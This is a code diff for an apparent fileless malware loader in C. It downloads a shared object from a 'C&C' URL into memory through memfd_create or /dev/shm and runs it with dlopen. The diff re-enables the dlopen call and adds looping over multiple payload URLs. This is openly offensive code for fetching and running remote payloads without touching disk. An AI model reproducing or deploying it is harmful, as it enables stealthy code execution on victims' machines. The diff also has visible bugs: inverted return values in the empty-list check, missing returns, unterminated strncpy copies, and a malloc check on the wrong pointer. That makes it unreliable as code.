@@ -15,20 +15,11 @@
 #include <sys/utsname.h>
 #include <unistd.h>
 
+#include "zaf.h"
 
 
-#define SHM_NAME "IceIceBaby"
+#define SHM_NAME "DragonSlayer"
 #define __NR_memfd_create 319 // https://code.woboq.org/qt5/include/asm/unistd_64.h.html
-
-typedef struct {
- int shm_fd;
-} Shared_Mem_Fd;
-
-typedef struct {
-  enum {SHM, MEMFD} mode;
-  int fd;
-  pid_t pid;
-} Mem_Fd_Loc;
 
 
 // Wrapper to call memfd_create syscall
@@ -140,7 +131,7 @@ int download_to_RAM(char *download) {
 }
 
 // Load the shared object from within
-void load_so(int shm_fd, Mem_Fd_Loc *fd_s) {
+void load_so(int shm_fd) {
 	char path[1024];
 	void *handle;
 
@@ -154,26 +145,111 @@ void load_so(int shm_fd, Mem_Fd_Loc *fd_s) {
 	    printf("[.] hmm, only shm supported.\n");
 	}
     printf("Path: %s\n", path);
-	/*handle = dlopen(path, RTLD_LAZY);
+	handle = dlopen(path, RTLD_LAZY);
 	if (!handle) {
 		fprintf(stderr,"[-] Dlopen failed with error: %s\n", dlerror());
-	}*/
+	}
 }
 
+// Get memfd location 
+int setMemfd(int shm_fd) {
+    char path[1024];
+    void *handle;
+    
+
+    printf("[+] Trying to load Shared Object!\n");
+    if (kernel_version() == 1) { //Funky way
+        printf("[.] yay, memfd supported.\n");
+        snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), shm_fd);
+    } else { // Not funky way :(
+        close(shm_fd);
+        snprintf(path, 1024, "/dev/shm/%s", SHM_NAME);
+        printf("[.] hmm, only shm supported.\n");
+    }
+    if ( check_empty(head) == 0 ) { // list is empty
+        printf("[.] List empty.\n");
+        head = malloc(sizeof(node_t));
+        if (head == NULL) {
+            return 1;
+        }
+        printf("[.] Adding node_t entry.\n");
+        push_first(head, path);
+    }else{
+        push(head, path);
+    }
+    printf("Path: %s\n", path);
+}
+
+
 int main (int argc, char **argv) {
-	char *url = "http://localhost:8080/libmctor.so";
+    char *urls[2] = {"http://localhost:8080/libmctor.so", "http://localhost:8080/libmctor.so"};
 	int fd;
+    int i;
 
 	printf("[+] Trying to reach C&C & start download...\n");
-	fd = download_to_RAM(url);
-    Mem_Fd_Loc *fd_s = malloc (sizeof (Mem_Fd_Loc));
+    for(i = 0; i < 2; i++)
+    {
+        printf("URL = %s \n", urls[i]);
+        fd = download_to_RAM(urls[i]);
+        setMemfd(fd);
 
-    if (fd_s != NULL){
-	  load_so(fd, fd_s);
-    }else{
-	  fprintf(stderr,"[-] Malloc() failed\n");
+        print_list(head);
     }
+
+
+    //load_so(fd, fd_s);
 
     sleep(1000000);
 	exit(0);
 }
+
+int check_empty(node_t * head){
+    int empty  = (head == NULL) ? 0 : 1;
+    //printf("Head is %d\n", empty);
+    return empty;
+}
+
+void print_list(node_t * head) {
+    node_t * current = head;
+    int c = 1;
+
+    while (current != NULL) {
+        printf("%d: (%d) %s\n", c, strlen(current->mpath), current->mpath);
+        current = current->next;
+        c++;
+    }
+}
+
+int push_first(node_t * head, char* path) {
+
+    if (head == NULL) {
+        return 1;
+    }
+
+    //printf("[.] Adding path: %s, strlen(path): %d\n", path, strlen(path));
+    strncpy(head->mpath, path, strlen(path));
+    head->next = NULL;
+    //printf("[.] List : mpath:%s:next: %d\n", head->mpath, head->next);
+    print_list(head);
+
+    return 0;
+}
+
+int push(node_t * head, char* path) {
+    node_t * current = head;
+
+    while (current->next != NULL) {
+        current = current->next;
+    }
+
+    //printf("[.] Adding path: %s, strlen(path): %d\n", path, strlen(path));
+    current->next = malloc(sizeof(node_t));
+    if (current == NULL) {
+        return 1;
+    }
+
+    strncpy(current->next->mpath, path, strlen(path));
+    current->next->next = NULL;
+
+}
+
